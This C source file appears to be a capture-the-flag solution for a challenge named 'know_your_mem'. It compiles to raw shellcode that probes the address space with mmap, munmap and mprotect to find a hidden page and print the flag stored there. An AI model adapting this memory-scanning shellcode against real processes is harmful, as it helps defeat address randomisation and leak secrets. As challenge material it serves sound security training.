// This is an example of turning simple C into raw shellcode.

// make shellcode.bin will compile to assembly
// make shellcode.bin.pkt will prepend the length so you can
//    ./know_your_mem < shellcode.bin.pkt

// Note: Right now the 'build' does not support .(ro)data
//       If you want them you'll have to adjust the Makefile.
//       They're not really necessary to solve this challenge though.


// From https://chromium.googlesource.com/linux-syscall-support/
static int my_errno = 0;
#define SYS_ERRNO my_errno
#include "linux-syscall-support/linux_syscall_support.h"


#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL


void _start()
{
    //sys_write(1, __builtin_frame_address(0), 5);  // Prints something (note: best avoid literals)
    //sys_exit_group(2);                            // Exit
    int alloc_multiple = 1 << 14;

    int size = 4096;
    void * start = ADDR_MIN;
    void * res;

    while(1){
      int alloc_len = alloc_multiple * size;
      res = sys_mmap(start, alloc_len, 4, 0x22, -1, 0);
      if(res == start || res != (void *)-1 ){
        sys_munmap(res, alloc_len);
      }
      //Handle cases with actual allocations
      if(res != start){
        //printf("trying to alloc %p %p\n", start, start + alloc_multiple * size);
        if(res == (void*)-1){
          //perror("");
        }
        if(alloc_multiple != 1){
          //printf("Gotem %d\n", alloc_multiple);
          //printf("count %d res %p start %p\n", count, res, start);
          alloc_multiple >>=1;
        }else if(alloc_multiple == 1){
          void * found = start;
          //printf("trying addr %p\n", found);
          //printf("try %s\n", found + (size * 4));
          int i;
          for(i = -4; i < 8; i++){
            void * this_guy = (void *)sys_mprotect((void *)found + (size * i), size, 7);
            //printf("this guy %d %p\n", i, this_guy);
            if(this_guy == NULL){
              char * found_string = (char *)(found + (size * i));
              if(found_string[0] == 'O'){
                sys_write(1, found_string, 1000);
                //return (void *)found_string;
              }else{
                //printf("Bad flag %p %s\n", found_string, found_string);
                start = found_string + (size * 500);
                alloc_multiple = (1 << 14);
              }
            }
          }
        }
      }
      else if(res == start){
        start += alloc_multiple * size;
      }
    }
}
